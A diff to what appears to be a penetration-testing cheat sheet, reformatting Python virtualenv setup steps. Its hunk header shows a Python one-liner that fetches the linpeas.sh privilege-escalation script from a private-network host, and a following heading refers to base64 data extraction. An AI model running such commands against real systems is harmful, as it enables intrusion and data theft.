@@ -203,31 +203,22 @@ python3 -c "import urllib.request;u = 'http://10.33.1.154:8080/linpeas.sh';urlli
 ## Python Virtualenv
 ### Setup instructions
 
-##### Install
+
 
 ```
-apt install virtualenv
-```
+# Install
+$ apt install virtualenv
 
-##### Setup enviroment
-
-```
-virtualenv -p /usr/bin/python2.7 venv 
-```
+# Setup enviroment
+$ virtualenv -p /usr/bin/python2.7 venv 
 - specified python version.. 
 
-#### Start enviroment
+# Start enviroment
+$ source venv/bin/activate
 
+# Deactivate
+$ deactivate
 ```
-source venv/bin/activate
-```
-
-##### Deactivate
-
-```
-deactivate
-```
-
 
 ## Gzip a file with base64 (data extract)
 
